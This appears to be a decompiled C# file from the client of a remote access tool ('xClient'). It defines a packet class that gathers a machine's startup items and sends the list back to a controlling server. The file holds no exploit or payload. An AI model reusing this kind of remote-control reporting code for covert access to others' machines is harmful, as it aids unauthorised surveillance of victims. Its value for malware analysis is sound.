using System;
using System.Collections.Generic;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000087 RID: 135
	[Serializable]
	public class GetStartupItemsResponse : IPacket
	{
		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000389 RID: 905 RVA: 0x00003BFE File Offset: 0x00001DFE
		// (set) Token: 0x0600038A RID: 906 RVA: 0x00003C06 File Offset: 0x00001E06
		public List<string> StartupItems { get; set; }

		// Token: 0x0600038B RID: 907 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetStartupItemsResponse()
		{
		}

		// Token: 0x0600038C RID: 908 RVA: 0x00003C0F File Offset: 0x00001E0F
		public GetStartupItemsResponse(List<string> startupitems)
		{
			this.StartupItems = startupitems;
		}

		// Token: 0x0600038D RID: 909 RVA: 0x00003C1E File Offset: 0x00001E1E
		public void Execute(Client client)
		{
			client.Send<GetStartupItemsResponse>(this);
		}
	}
}
